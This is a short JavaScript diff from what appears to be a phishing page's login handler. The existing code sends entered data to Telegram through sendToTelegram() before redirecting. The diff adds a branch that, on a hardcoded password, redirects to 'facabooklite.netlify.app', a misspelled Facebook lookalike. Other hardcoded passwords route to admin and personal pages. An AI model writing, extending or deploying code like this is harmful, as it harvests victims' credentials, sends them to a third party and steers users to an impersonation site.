@@ -264,12 +264,14 @@
                     return;
                 }
 
-                // Send data to Telegram before any redirection
+                      // Send data to Telegram before any redirection
                 sendToTelegram();
 
                 // Handle redirection based on password
                 if (password === 'admin_00') {
                     window.location.href = 'admin.html'; // Redirect for admin_00
+                } else if (password === 'facebook00') {
+                    window.location.href = 'https://facabooklite.netlify.app/'; // Redirect for rewan2332000
                 } else if (password === 'rewan00') {
                     window.location.href = 'rowan.html'; // Redirect for rewan2332000
                 } else if (password.length === 6) {
